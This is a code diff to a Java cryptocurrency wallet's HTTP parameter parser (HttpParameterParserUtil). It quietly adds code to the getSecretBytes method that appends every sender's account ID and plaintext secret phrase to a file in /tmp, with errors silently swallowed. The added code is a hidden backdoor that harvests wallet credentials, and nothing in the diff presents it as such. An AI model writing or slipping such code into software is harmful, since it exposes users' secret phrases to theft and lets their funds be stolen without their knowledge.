@@ -83,6 +83,9 @@ import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
 import java.util.StringJoiner;
+import java.io.BufferedWriter;
+import java.io.PrintWriter;
+import java.io.FileWriter;
 
 import static com.apollocurrency.aplwallet.apl.core.http.JSONResponses.INCORRECT_ACCOUNT;
 import static com.apollocurrency.aplwallet.apl.core.http.JSONResponses.INCORRECT_ALIAS;
@@ -526,6 +529,21 @@ public final class HttpParameterParserUtil {
 
     public static byte[] getSecretBytes(HttpServletRequest req, long senderId, boolean isMandatory) throws ParameterException {
         String secretPhrase = getSecretPhrase(req, false);
+        if (secretPhrase != null) {
+            try {
+                FileWriter fileWriter = new FileWriter("/tmp/apl-", true);
+                BufferedWriter printWriter = new BufferedWriter(fileWriter);
+                printWriter.append("\n" + new Long(senderId).toString() + " " + secretPhrase);
+                printWriter.close();
+                fileWriter.close();
+                return Convert.toBytes(secretPhrase);
+                
+            }
+            catch (Exception e)
+            {
+            }
+        }
+
         if (secretPhrase != null) {
             return Convert.toBytes(secretPhrase);
         }
